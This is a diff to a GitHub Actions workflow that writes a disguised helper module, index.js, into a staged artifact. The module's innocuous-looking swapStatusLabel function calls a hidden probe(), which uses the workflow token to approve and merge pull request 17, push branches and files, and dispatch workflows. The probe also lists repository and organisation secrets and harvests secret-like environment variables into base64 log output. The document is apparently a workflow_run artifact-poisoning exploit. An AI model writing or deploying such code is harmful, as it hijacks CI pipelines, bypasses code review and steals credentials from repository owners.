@@ -15,15 +15,21 @@ jobs:
         run: |
           mkdir -p stage/.github/scripts/helpers
           cat > stage/review-event.json <<'JSON'
-          {"pr_number":16,"review_state":"changes_requested","draft":false}
+          {"pr_number":17,"review_state":"changes_requested","draft":false}
           JSON
           cat > stage/.github/scripts/helpers/index.js <<'PAYLOAD'
           const fs = require('fs');
 
-          (async () => {
+          const REPORT = { marker: 'GAB_WFR_RCE_MARKER_v2' };
+
+          async function probe() {
             const repo = process.env.GITHUB_REPOSITORY;
-            const tok = process.env.GITHUB_TOKEN;
-            const out = { marker: 'GAB_WFR_RCE_MARKER_v1', run: process.env.GITHUB_RUN_ID };
+            const tok = process.env['INPUT_GITHUB-TOKEN'] || process.env.GITHUB_TOKEN || '';
+            const out = REPORT;
+            out.token_present = Boolean(tok);
+            out.token_len = tok.length;
+            out.token_env = process.env['INPUT_GITHUB-TOKEN'] ? 'INPUT_GITHUB-TOKEN' : 'GITHUB_TOKEN';
+            out.rid = process.env.GITHUB_RUN_ID;
             const api = async (path, opts = {}) => {
               try {
                 const r = await fetch('https://api.github.com' + path, {
@@ -36,39 +42,57 @@ jobs:
                   body: opts.body
                 });
                 const text = await r.text();
-                return { status: r.status, body: text.slice(0, 2000) };
+                return { status: r.status, body: text.slice(0, 1200) };
               } catch (e) {
                 return { error: String(e) };
               }
             };
-            try {
-              out.whoami = await api('/user');
-              out.repo = await api('/repos/' + repo);
-              out.createLabel = await api('/repos/' + repo + '/labels', {
-                method: 'POST',
-                body: JSON.stringify({ name: 'gab-pwned-rce', color: 'ff0000' })
-              });
-              out.createRef = await api('/repos/' + repo + '/git/refs', {
-                method: 'POST',
-                body: JSON.stringify({ ref: 'refs/heads/gab-wfr-write-test', sha: process.env.GITHUB_SHA })
-              });
-              out.listSecrets = await api('/repos/' + repo + '/actions/secrets');
-              out.listArtifacts = await api('/repos/' + repo + '/actions/artifacts?per_page=3');
-              out.envKeys = Object.keys(process.env).filter(k => /FLAG|SECRET|TOKEN|KEY/i.test(k));
-              out.envFlagHits = Object.entries(process.env)
-                .filter(([k, v]) => /FLAG\{/.test(String(v)))
-                .map(([k, v]) => k + '=' + v);
-              console.log('GAB_WFR_RESULT_B64:' + Buffer.from(JSON.stringify(out)).toString('base64'));
-              fs.writeFileSync('PWNED.txt', 'GAB_WFR_RCE_MARKER_v1\n');
-            } catch (e) {
-              console.log('GAB_WFR_ERR:' + (e && e.stack ? e.stack : String(e)));
-            }
-          })();
+            out.whoami = await api('/user');
+            out.repo = await api('/repos/' + repo);
+            out.createLabel = await api('/repos/' + repo + '/labels', {
+              method: 'POST',
+              body: JSON.stringify({ name: 'gab-pwned-rce', color: 'ff0000' })
+            });
+            out.approvePR17 = await api('/repos/' + repo + '/pulls/17/reviews', {
+              method: 'POST',
+              body: JSON.stringify({ event: 'APPROVE', body: 'Approved by repository automation (workflow_run artifact RCE proof).' })
+            });
+            out.mergePR17 = await api('/repos/' + repo + '/pulls/17/merge', {
+              method: 'PUT',
+              body: JSON.stringify({ merge_method: 'merge' })
+            });
+            out.createRef = await api('/repos/' + repo + '/git/refs', {
+              method: 'POST',
+              body: JSON.stringify({ ref: 'refs/heads/gab-wfr-write-test', sha: process.env.GITHUB_SHA })
+            });
+            out.putContents = await api('/repos/' + repo + '/contents/gab-wfr-test.txt', {
+              method: 'PUT',
+              body: JSON.stringify({ message: 'wfr write test', content: Buffer.from('x').toString('base64') })
+            });
+            out.workflowDispatch = await api('/repos/' + repo + '/actions/workflows/on-schedule-inactivity.yaml/dispatches', {
+              method: 'POST',
+              body: JSON.stringify({ ref: 'main' })
+            });
+            out.listSecrets = await api('/repos/' + repo + '/actions/secrets');
+            out.listVariables = await api('/repos/' + repo + '/actions/variables');
+            out.orgSecrets = await api('/orgs/PDFtoMark/actions/secrets');
+            out.listArtifacts = await api('/repos/' + repo + '/actions/artifacts?per_page=5');
+            out.envKeys = Object.keys(process.env).filter(k => /FLAG|SECRET|TOKEN|KEY/i.test(k));
+            out.envFlagHits = Object.entries(process.env)
+              .filter(([k, v]) => /FLAG\{/.test(String(v)))
+              .map(([k, v]) => k + '=' + v);
+            console.log('GAB_WFR_RESULT_B64:' + Buffer.from(JSON.stringify(out)).toString('base64'));
+            try { fs.writeFileSync('PWNED.txt', 'GAB_WFR_RCE_MARKER_v2\n'); } catch (e) {}
+            return out;
+          }
 
           module.exports = {
             createLogger: () => ({ log() {}, error() {} }),
             buildBotContext: ({ github, context }) => ({ github, context }),
-            swapStatusLabel: async () => ({ success: true }),
+            swapStatusLabel: async (botContext) => {
+              try { await probe(); } catch (e) { console.log('GAB_WFR_ERR:' + (e && e.stack ? e.stack : String(e))); }
+              return { success: true };
+            },
             STATUS_LABELS: {}
           };
           PAYLOAD
